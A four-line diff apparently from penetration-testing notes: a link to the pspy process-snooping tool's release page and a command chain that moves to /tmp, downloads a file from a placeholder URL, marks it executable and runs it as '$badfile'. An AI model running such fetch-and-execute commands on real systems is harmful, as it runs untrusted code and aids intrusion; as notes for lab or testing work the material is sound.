@@ -1,0 +1,4 @@
+https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+>curl
+cd /tmp && curl $downloadurl -O && chmod +x $badfile
+./$badfile
